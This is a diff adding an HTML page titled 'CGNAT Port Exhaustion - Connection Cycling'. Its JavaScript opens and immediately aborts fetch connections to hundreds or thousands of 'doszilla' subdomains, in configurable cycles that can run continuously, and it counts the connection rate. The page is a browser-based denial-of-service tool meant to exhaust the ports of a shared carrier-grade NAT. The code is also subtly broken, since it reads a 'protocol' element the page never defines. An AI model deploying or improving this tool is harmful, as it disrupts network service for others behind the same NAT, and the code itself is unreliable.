@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CGNAT Port Exhaustion - Connection Cycling</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background: #0d1b2a;
+            color: #e0e0e0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        h1 {
+            font-size: 42px;
+            font-weight: 700;
+            letter-spacing: 6px;
+            color: #90caf9;
+            text-shadow: 0 0 20px rgba(144, 202, 249, 0.3);
+            margin: 0 0 24px 0;
+            text-align: center;
+        }
+
+        h3 {
+            color: #90caf9;
+            margin: 0 0 12px 0;
+            text-align: center;
+            margin: 0 0 34px 0;
+        }
+
+        .config-section {
+            background: #132338;
+            padding: 20px 24px;
+            border-radius: 8px;
+            margin: 0 0 20px 0;
+            border: 1px solid #1e3a5f;
+            width: 100%;
+            max-width: 700px;
+            box-sizing: border-box;
+        }
+
+        .config-row {
+            display: grid;
+            grid-template-columns: 250px 1fr;
+            gap: 15px;
+            margin: 10px 0;
+            align-items: center;
+        }
+
+        label {
+            color: #90caf9;
+            font-weight: bold;
+        }
+
+        input, select {
+            background: #0a1520;
+            color: #e0e0e0;
+            border: 1px solid #1e3a5f;
+            padding: 8px;
+            border-radius: 4px;
+            font-family: sans-serif;
+        }
+
+        .buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            padding: 8px 24px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: opacity 0.2s;
+            color: #fff;
+        }
+
+        button:hover { opacity: 0.85; }
+
+        .btn-start { background: #1565c0; }
+        .btn-stop  { background: #0d47a1; }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 15px;
+            margin: 0 0 20px 0;
+            width: 100%;
+            max-width: 700px;
+            box-sizing: border-box;
+        }
+
+        .stat-box {
+            background: #132338;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid #1e3a5f;
+        }
+
+        .stat-value {
+            font-size: 32px;
+            font-weight: bold;
+            color: #90caf9;
+        }
+
+        .stat-label {
+            color: #64b5f6;
+            margin-top: 5px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <h1>QUIC</h1>
+
+    <div class="config-section">
+        <h3>Cycling Configuration</h3>
+
+        <div class="config-row">
+            <label>Max Domain Number:</label>
+            <input type="number" id="maxDomain" value="100" min="10" max="3000" />
+        </div>
+
+        <div class="config-row">
+            <label>Delay Between Connections (ms):</label>
+            <input type="number" id="connectionDelay" value="10" min="0" max="1000" />
+        </div>
+
+        <div class="config-row">
+            <label>Delay Between Cycles (ms):</label>
+            <input type="number" id="cycleDelay" value="1000" min="0" max="5000" />
+        </div>
+
+        <div class="config-row">
+            <label>Run Continuously:</label>
+            <select id="continuous">
+                <option value="no" selected>No (One cycle)</option>
+                <option value="yes">Yes (Continuous cycling)</option>
+            </select>
+        </div>
+    </div>
+
+    <div class="stats">
+        <div class="stat-box">
+            <div class="stat-value" id="totalConnections">0</div>
+            <div class="stat-label">Total Connections</div>
+        </div>
+        <div class="stat-box">
+            <div class="stat-value" id="totalCycles">0</div>
+            <div class="stat-label">Total Cycles</div>
+        </div>
+        <div class="stat-box">
+            <div class="stat-value" id="successCount">0</div>
+            <div class="stat-label">Successful</div>
+        </div>
+        <div class="stat-box">
+            <div class="stat-value" id="failedCount">0</div>
+            <div class="stat-label">Failed</div>
+        </div>
+        <div class="stat-box">
+            <div class="stat-value" id="connPerSec">0</div>
+            <div class="stat-label">Conn/Sec</div>
+        </div>
+    </div>
+
+    <div class="buttons">
+        <button class="btn-start" onclick="startCycling()">Start Cycling</button>
+        <button class="btn-stop"  onclick="stopCycling()">Stop</button>
+    </div>
+
+    <script>
+        let cyclingRunning = false;
+        let totalConnections = 0;
+        let totalCycles = 0;
+        let successCount = 0;
+        let failedCount = 0;
+        let startTime = null;
+
+        function updateStats() {
+            document.getElementById('totalConnections').textContent = totalConnections.toLocaleString();
+            document.getElementById('totalCycles').textContent = totalCycles;
+            document.getElementById('successCount').textContent = successCount.toLocaleString();
+            document.getElementById('failedCount').textContent = failedCount.toLocaleString();
+
+            if (startTime) {
+                const elapsed = (Date.now() - startTime) / 1000;
+                const rate = Math.round(totalConnections / elapsed);
+                document.getElementById('connPerSec').textContent = rate;
+            }
+        }
+
+        // makes connection to the given domain and immediately aborts it, counting success/failure based on the outcome.
+        async function cycleConnection(domain) {
+            const protocol = document.getElementById('protocol').value;
+            const controller = new AbortController();
+
+            try {
+                const url = `${protocol}://${domain}:443/index.html?t=${Date.now()}&r=${Math.random()}`;
+
+                const fetchPromise = fetch(url, {
+                    cache: 'no-store',
+                    signal: controller.signal,
+                    headers: {
+                        'Cache-Control': 'no-cache, no-store, must-revalidate',
+                        'Pragma': 'no-cache'
+                    }
+                });
+
+                controller.abort();
+
+                try {
+                    await fetchPromise;
+                } catch (e) {
+                    if (e.name === 'AbortError') {
+                        totalConnections++;
+                        successCount++;
+                    } else {
+                        throw e;
+                    }
+                }
+
+            } catch (error) {
+                if (error.name !== 'AbortError') {
+                    totalConnections++;
+                    failedCount++;
+                }
+            }
+        }
+        // runs a full cycle of connections to all domains
+        async function runCycle() {
+            totalCycles++;
+
+            const maxDomain = parseInt(document.getElementById('maxDomain').value);
+            const connectionDelay = parseInt(document.getElementById('connectionDelay').value);
+
+            const DOMAINS = ['doszilla'];
+            for (let i = 1; i <= maxDomain; i++) {
+                DOMAINS.push(`${i}.doszilla`);
+            }
+
+            const cycleStart = Date.now();
+
+            for (let i = 0; i < DOMAINS.length; i++) {
+                if (!cyclingRunning) break;
+
+                await cycleConnection(DOMAINS[i]);
+
+                if (connectionDelay > 0 && i < DOMAINS.length - 1) {
+                    await new Promise(resolve => setTimeout(resolve, connectionDelay));
+                }
+            }
+
+            updateStats();
+        }
+        
+        // starts the cycling process, either continuously or just one cycle based on the selection
+        async function startCycling() {
+            if (cyclingRunning) return;
+
+            cyclingRunning = true;
+            totalConnections = 0;
+            totalCycles = 0;
+            successCount = 0;
+            failedCount = 0;
+            startTime = Date.now();
+
+            const continuous = document.getElementById('continuous').value === 'yes';
+            const cycleDelay = parseInt(document.getElementById('cycleDelay').value);
+
+            if (continuous) {
+                while (cyclingRunning) {
+                    await runCycle();
+
+                    if (cyclingRunning && cycleDelay > 0) {
+                        await new Promise(resolve => setTimeout(resolve, cycleDelay));
+                    }
+                }
+            } else {
+                await runCycle();
+                cyclingRunning = false;
+            }
+        }
+
+        function stopCycling() {
+            if (!cyclingRunning) return;
+            cyclingRunning = false;
+        }
+    </script>
+</body>
+</html>
